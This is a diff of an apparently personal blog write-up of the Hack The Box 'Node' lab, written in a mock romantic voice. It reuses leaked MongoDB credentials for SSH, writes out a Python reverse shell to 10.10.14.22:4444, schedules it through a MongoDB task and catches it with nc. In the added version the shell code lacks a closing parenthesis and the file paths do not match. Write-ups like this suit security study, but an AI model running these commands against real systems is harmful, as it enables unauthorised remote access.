@@ -74,34 +74,45 @@ rock@hack ~/Downloads# head -n 11 var/www/myplace/app.js | tail -n 1
 const url        = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
 {% endhighlight %}
 
-`mark`...?
-`mark`.
-"Who is this `mark`?" I wondered. What boundries had you let him pass?
-Nevermind. I had his secret, and he made a fatal mistake, leaving this behind.
+Who was this `mark`?" I wondered. What boundries had you let him pass?
+Nevermind. I had his secret, and he made a mistake, leaving this behind.
 
 {% highlight shell %}
 root@hack ~# ssh mark@node.htb
+mark@node ~$
 {% endhighlight %}
 
-mark password for mongo: 5AYRft73VtFpc84k and ssh
+Node, my sweet Node, I felt so close to you. We were separated by miles and miles, but I could feel your circuits responding to my touch.
+
 /var/scheduler/app.js > runs mongo tasks
+
+mark@node ~$ cat << EOM > /tmp/over.py
+> import socket,subprocess,os
+> s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+> s.connect(('10.10.14.22',4444))
+> os.dup2(s.fileno(),0)
+> os.dup2(s.fileno(),1)
+> os.dup2(s.fileno(),2)
+> p=subprocess.call(['/bin/sh','-i']
+EOM
+
+mongo
 db.auth("mark","5AYRft73VtFpc84k")
-insert tasks to print flag
-FIRST BLOOD BABY
-import socket,subprocess,os
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(('10.10.14.22',4444))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-p=subprocess.call(['/bin/sh','-i'])
-use scheduler to run
 db.tasks.insert({"_id":"1","cmd":"python /tmp/over/over.py"})
-get shell
+
+nc -lvvvp 4444
+
+cat /home/frank/user.txt
+
+I tasted your sweet blood.
+
 reverse backup to see that it blacklists characters and needs a key
 run from / and backup /root
 get key
 win
+
+your dearest,
+overcast
 
 
 _fin_
